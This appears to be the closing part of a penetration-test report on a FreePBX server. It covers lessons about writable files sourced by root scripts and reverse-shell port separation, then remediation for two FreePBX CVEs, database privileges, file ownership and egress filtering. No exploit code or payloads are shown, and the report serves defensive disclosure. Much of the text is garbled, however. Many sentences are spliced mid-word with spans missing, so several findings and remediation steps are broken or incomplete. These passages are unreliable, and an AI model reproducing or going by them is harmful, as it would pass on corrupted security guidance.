5. source directives in root-run scripts are as exploitable as SUID binaries — if the  sourced file is writable.The comment in /etc/init.d/dah the following values. Edit/etc/dahdi/init.conf instead." administrators, but it wasequally useful as a roadmap fot-executed script contains asource, ., include, or require directive, trace it to the target file and check that fiownership and permissions. A wvileged execution chain isequivalent to a writable SUID6. Separate your shells by porUsing port 4444 for the initia the root shell kept the twophases of the engagement cleanly separated in the evidence trail and avoided any risk othe new connection colliding wengagements with multiple shellsor pivots, establishing a simpg. 4444 for initial access,4445+ for privilege escalationsignificantly easier toreconstruct the attack chain w

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations

7.1 Patch CVE-2025-57819 and CVE-2025-61678 (FreePBX 16.0.40.7)

What it is: The target ran FreePBX 16.0.40.7, a version explicitly named as vulnerable in two critical public advisories — CVE-2025-57819 (unauthenticated stacked SQL injection → RCE, CVSS 10.0) and CVE-2025-61678 (authenticated arbitrary file upload via path traversal). Both vulnerabilities were chained in this engagement to achieve remote code execution without any prior knowledge of legitimate credentials.

Why it is dangerous: CVE-2025-57819 requires no authentication whatsoever and carries the maximum possible CVSS score. A single crafted HTTP GET request injects an admin account into the database. CVE-2025-61678 then converts that admin access into a webshell on the public webroot within seconds. The complete chain from zero access to a remote shell takes under two minutes and requires no user interaction, MFA bypass, or social engineering.

Remediation:
Apply the FreePBX security patches referenced in both advisories immediately (fwconsole ma upgradeall after refreshing module repositories, or apply the vendor's emergency hotfix packages directly).
Until patched, place the FreePBX administration interface behind a VPN or IP allowlist so /admin/ is never reachable from untrusted networks — this is the single most impactful short-term control.
Subscribe to FreePBX/Sangoma security advisories and establish a documented patch-within-N-days SLA for critical (CVSS ≥ 9.0) findings on telephony infrastructure.

7.2 Restrict Database Account
What it is: The MariaDB accounlication has INSERT and DELETErights on the asterisk.ampuserrols who can authenticate to theadmin panel. Any SQL injectionimmediately becomes anauthentication bypass, regardless of how strong the existing admin passwords are.      Why it is dangerous: The datab "unauthenticated web request"to "valid admin session" in a single injected statement. There is no second factor, no limiting, and no out-of-band accessful injection and fulladmin access to the PBX.
Remediation:                                                                           - Apply the principle of least MySQL grant — it should onlyhave the specific permissions res for normal applicationoperation, and should never have direct write access to authentication tables like ampuoutside of validated, paramete
Configure the PHP MySQL driver to disallow multiple statements per query (avoid      mysqli::multi_query, or set PDS => false) so that even asuccessful string-escape cannowrite primitive.- Periodically audit SHOW GRANst' against a documentedleast-privilege baseline.

7.3 Fix File Ownership on theWhat it is: Two files criticalchain were owned by thelow-privileged asterisk servick/sysadmin/dahdi_restart (theincron watch target that triggnd /etc/dahdi/init.conf (aconfiguration file sourced dircript). Any process running asasterisk — including a remote  purely through the webvulnerability — could escalatewriting to these two files.
Why it is dangerous: This misconfiguration completely undermines the separation betweenasterisk service identity and  privilege escalation requiresno exploit, no credential, andst two file writes. It isentirely silent and leaves no ogs beyond the normal DAHDIrestart sequence.Remediation:- Change ownership of both /vadi_restart and/etc/dahdi/init.conf to root:rsterisk can read but not writeto either file.
Audit every path referenced in /etc/incron.d/* and every file sourced via .  or sourcroot-executed init scripts — a-root account represent thesame class of vulnerability. Tes a starting point: find/etc/incron.d/ -type f -exec cevery referenced path.- Where the asterisk service atrigger a DAHDI restart (e.g.for operational automation), implement it via a narrowly-scoped sudo rule rather than afile-watch-and-execute mechaniSWD:/usr/sbin/sysadmin_dahdi_restaerational outcome whileproducing an auditable log entry and eliminating the writable-sourced-config attack surface entirely.


7.4 Implement Egress Filtering and Host-Based Monitoring                               
What it is: Both reverse shells established during this engagement — the initial asterishell and the root shell — conet to an arbitrary external IPon non-standard high ports (44t inspection, alerting, orblocking.
Why it is dangerous: A FreePBXreason to open arbitraryoutbound TCP connections to internet hosts on ephemeral ports. Unrestricted egress means that even if every vulnerability above were patched, a future unpatched flaw would stilallow an attacker to establishl and operate freely inside thenetwork without detection.Remediation:- Implement egress filtering aault-deny outbound, withexplicit allowlists for requirg providers, NTP, updaterepositories).- Deploy host-based monitorings parent-child processrelationships, such as httpd → bash or crond → bash, which are reliable indicators of webshell or cron-based code execution.                                                 - Forward incrond, cron, and aIEM and alert on unexpectedexecutions of scripts referencularly those firing outside ofexpected maintenance windows.

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

